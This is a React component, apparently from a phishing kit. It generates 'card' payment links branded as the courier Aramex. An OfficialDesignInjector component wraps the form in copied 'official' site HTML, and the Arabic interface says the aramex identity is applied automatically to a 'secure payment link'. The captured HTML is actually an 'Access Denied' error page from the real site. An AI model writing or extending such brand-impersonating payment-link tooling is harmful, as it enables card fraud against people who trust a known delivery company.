
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useSupabase';
import { OfficialDesignInjector } from '@/components/OfficialDesignInjector';

const AramexLinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: 'card',
      entityId: 'aramex'
    });
  };

  const officialHTML = `
<h1>Access Denied</h1>
 
You don't have permission to access "http://www.aramex.com/" on this server.<p>
Reference #18.4fd02e17.1778279213.b5542601
</p><p>https://errors.edgesuite.net/18.4fd02e17.1778279213.b5542601</p>


`;
  const officialCSS = ``;

  return (
    <OfficialDesignInjector entityId="aramex" html={officialHTML} css={officialCSS}>
      <div className="official-input-overlay" style={{ 
        position: 'absolute', 
        top: '50%', 
        left: '50%', 
        transform: 'translate(-50%, -50%)',
        zIndex: 1000,
        background: 'rgba(255,255,255,0.95)',
        padding: '30px',
        borderRadius: '12px',
        boxShadow: '0 4px 30px rgba(0,0,0,0.3)',
        width: '100%',
        maxWidth: '420px',
        border: '1px solid #eee'
      }}>
        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <h2 style={{ margin: 0, color: '#1a1a1a', fontSize: '22px', fontWeight: 'bold' }}>بوابة إصدار الروابط الرسمية</h2>
          <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>سيتم تطبيق هوية aramex تلقائياً</p>
        </div>
        <div style={{ marginBottom: '15px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>المبلغ المطلوب</label>
          <input 
            placeholder="0.00" 
            value={amount} 
            onChange={(e) => setAmount(e.target.value)}
            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '18px', boxSizing: 'border-box' }}
          />
        </div>
        <div style={{ marginBottom: '20px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>الوصف / رقم المرجع</label>
          <input 
            placeholder="ادخل تفاصيل العملية" 
            value={description} 
            onChange={(e) => setDescription(e.target.value)}
            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '16px', boxSizing: 'border-box' }}
          />
        </div>
        <button 
          onClick={handleCreate} 
          disabled={loading}
          style={{ 
            width: '100%', 
            height: '56px', 
            background: '#1a1a1a', 
            color: '#fff', 
            borderRadius: '12px', 
            fontSize: '18px', 
            fontWeight: 'bold', 
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}
        >
          {loading ? 'جاري الإصدار...' : 'إنشاء رابط دفع آمن'}
        </button>
        {generatedLink && (
          <div style={{ marginTop: '25px', padding: '15px', background: '#f8fafc', border: '1px dashed #334155', borderRadius: '8px', wordBreak: 'break-all' }}>
            <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '5px' }}>الرابط المولد:</p>
            <div style={{ fontWeight: 'bold', color: '#0f172a', fontSize: '14px' }}>{generatedLink}</div>
            <button 
              onClick={() => navigator.clipboard.writeText(generatedLink)}
              style={{ marginTop: '10px', background: '#334155', color: '#fff', border: 'none', borderRadius: '4px', padding: '5px 10px', fontSize: '12px', cursor: 'pointer' }}
            >
              نسخ الرابط
            </button>
          </div>
        )}
      </div>
    </OfficialDesignInjector>
  );
};

export default AramexLinkCreator;
